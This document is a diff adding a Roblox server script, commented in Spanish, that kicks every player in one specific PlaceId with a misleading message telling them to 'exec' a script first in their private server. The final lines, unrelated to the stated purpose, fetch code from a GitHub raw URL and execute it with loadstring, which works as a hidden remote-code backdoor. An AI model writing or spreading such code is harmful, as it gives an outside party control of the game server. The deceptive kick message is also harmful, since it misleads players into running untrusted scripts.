@@ -1,0 +1,28 @@
+-- Script para kickear automáticamente si estás en el PlaceId específico
+-- Colócalo como un Script normal (ServerScript) en ServerScriptService
+
+local TARGET_PLACE_ID = 99606176102979
+local KICK_MESSAGE = "‼️SCRIPT ITS UPDATED, YOU NEED TO EXEC FIRST IN YOR PS FOR CONFIG‼️"
+
+game.Players.PlayerAdded:Connect(function(player)
+    if game.PlaceId == TARGET_PLACE_ID then
+        -- Pequeño delay para que el jugador se cargue correctamente
+        task.wait(2)
+        
+        player:Kick(KICK_MESSAGE)
+        print("Jugador " .. player.Name .. " kickeado del PlaceId " .. TARGET_PLACE_ID)
+    end
+end)
+
+-- También kickear a los jugadores que ya estén en el servidor al cargar el script
+for _, player in ipairs(game.Players:GetPlayers()) do
+    if game.PlaceId == TARGET_PLACE_ID then
+        task.spawn(function()
+            task.wait(1)
+            player:Kick(KICK_MESSAGE)
+        end)
+    end
+end
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EnvyPVP/EnvyHub/refs/heads/main/Sourceenvy"))()
+end)
